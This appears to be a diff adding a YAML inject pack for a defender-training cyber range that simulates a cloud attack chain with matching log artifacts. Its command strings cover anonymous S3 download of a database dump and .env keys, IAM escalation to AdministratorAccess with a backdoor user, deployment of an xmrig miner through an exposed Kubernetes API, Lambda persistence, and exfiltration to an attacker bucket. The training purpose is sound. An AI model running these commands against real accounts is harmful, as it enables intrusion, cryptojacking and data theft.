@@ -1,0 +1,150 @@
+id: inject-cloud-misconfiguration
+name: Cloud Misconfiguration Inject Pack
+version: "1.0"
+description: |
+  Simulates common cloud security misconfigurations including a publicly
+  accessible S3 bucket, an overpermissioned IAM role, and an exposed
+  Kubernetes dashboard. Designed to train defenders on cloud posture
+  management and cloud-native detection capabilities.
+mitre_attack:
+  - T1530      # Data from Cloud Storage Object
+  - T1078.004  # Valid Accounts: Cloud Accounts
+  - T1610      # Deploy Container
+  - T1098.003  # Account Manipulation: Additional Cloud Roles
+  - T1580      # Cloud Infrastructure Discovery
+
+injects:
+  - id: public-s3-bucket
+    type: simulated_execution
+    delay_minutes: 0
+    params:
+      technique: T1530
+      description: "Attacker discovers and exploits a publicly accessible S3 bucket"
+      commands:
+        - "aws s3 ls s3://company-public-assets --no-sign-request --region us-east-1"
+        - "aws s3 cp s3://company-public-assets/backups/db-dump-2026-02.sql.gz . --no-sign-request"
+        - "aws s3 cp s3://company-public-assets/config/.env . --no-sign-request"
+      artifacts:
+        - type: s3_access_log
+          bucket: "company-public-assets"
+          action: "ListBucket"
+          requester: "ANONYMOUS"
+          source_ip: "{{ attacker_ip }}"
+        - type: s3_access_log
+          bucket: "company-public-assets"
+          action: "GetObject"
+          key: "backups/db-dump-2026-02.sql.gz"
+          requester: "ANONYMOUS"
+          bytes_sent: 524288000
+        - type: s3_access_log
+          bucket: "company-public-assets"
+          action: "GetObject"
+          key: "config/.env"
+          requester: "ANONYMOUS"
+          bytes_sent: 2048
+          description: "Environment file contains AWS access keys"
+
+  - id: overpermissioned-iam-role
+    type: simulated_execution
+    delay_minutes: 10
+    depends_on: public-s3-bucket
+    params:
+      technique: T1098.003
+      description: "Attacker uses leaked credentials from .env to exploit overpermissioned IAM role"
+      commands:
+        - "aws sts get-caller-identity"
+        - "aws iam list-attached-role-policies --role-name dev-deploy-role"
+        - "aws iam attach-role-policy --role-name dev-deploy-role --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
+        - "aws iam create-user --user-name svc-monitoring"
+        - "aws iam create-access-key --user-name svc-monitoring"
+        - "aws iam attach-user-policy --user-name svc-monitoring --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
+      artifacts:
+        - type: cloudtrail_event
+          event_name: "GetCallerIdentity"
+          source_ip: "{{ attacker_ip }}"
+          user_identity_type: "IAMUser"
+          user_name: "dev-deploy"
+        - type: cloudtrail_event
+          event_name: "AttachRolePolicy"
+          request_parameters:
+            roleName: "dev-deploy-role"
+            policyArn: "arn:aws:iam::aws:policy/AdministratorAccess"
+        - type: cloudtrail_event
+          event_name: "CreateUser"
+          request_parameters:
+            userName: "svc-monitoring"
+        - type: cloudtrail_event
+          event_name: "CreateAccessKey"
+          response_elements:
+            userName: "svc-monitoring"
+
+  - id: exposed-kubernetes-dashboard
+    type: simulated_execution
+    delay_minutes: 20
+    depends_on: overpermissioned-iam-role
+    params:
+      technique: T1610
+      description: "Attacker accesses exposed Kubernetes dashboard and deploys malicious container"
+      commands:
+        - "curl -k https://{{ k8s_dashboard_ip }}:8443/api/v1/namespaces"
+        - "kubectl --server=https://{{ k8s_dashboard_ip }}:6443 --token={{ service_account_token }} create -f crypto-miner.yaml"
+        - "kubectl --server=https://{{ k8s_dashboard_ip }}:6443 --token={{ service_account_token }} exec -it miner-pod -- /bin/sh"
+      artifacts:
+        - type: k8s_audit_log
+          verb: "list"
+          resource: "namespaces"
+          user: "system:anonymous"
+          source_ip: "{{ attacker_ip }}"
+        - type: k8s_audit_log
+          verb: "create"
+          resource: "pods"
+          namespace: "default"
+          pod_name: "miner-pod"
+          container_image: "xmrig/xmrig:latest"
+        - type: k8s_audit_log
+          verb: "create"
+          resource: "pods/exec"
+          pod_name: "miner-pod"
+        - type: network_connection
+          src: "miner-pod"
+          dst_ip: "pool.minexmr.com"
+          dst_port: 4444
+          protocol: "stratum+tcp"
+          description: "Crypto mining pool connection"
+
+  - id: cloud-persistence
+    type: simulated_execution
+    delay_minutes: 30
+    depends_on: exposed-kubernetes-dashboard
+    params:
+      technique: T1098.003
+      description: "Establish persistence via Lambda function and EventBridge rule"
+      commands:
+        - "aws lambda create-function --function-name health-monitor --runtime python3.11 --handler lambda_function.handler --role arn:aws:iam::{{ account_id }}:role/lambda-admin --zip-file fileb://backdoor.zip"
+        - "aws events put-rule --name daily-check --schedule-expression 'rate(6 hours)'"
+        - "aws events put-targets --rule daily-check --targets Id=1,Arn=arn:aws:lambda:us-east-1:{{ account_id }}:function:health-monitor"
+      artifacts:
+        - type: cloudtrail_event
+          event_name: "CreateFunction20150331"
+          function_name: "health-monitor"
+        - type: cloudtrail_event
+          event_name: "PutRule"
+          rule_name: "daily-check"
+
+  - id: cloud-data-exfil
+    type: simulated_execution
+    delay_minutes: 40
+    depends_on: cloud-persistence
+    params:
+      technique: T1530
+      description: "Exfiltrate data from additional S3 buckets using escalated permissions"
+      commands:
+        - "aws s3 sync s3://company-internal-data ./exfil/ --profile svc-monitoring"
+        - "aws s3 cp ./exfil/ s3://attacker-bucket-{{ random }}/ --recursive --profile svc-monitoring"
+      artifacts:
+        - type: s3_access_log
+          bucket: "company-internal-data"
+          action: "GetObject"
+          total_objects: 1500
+          total_bytes: 2147483648
+          user_identity: "svc-monitoring"
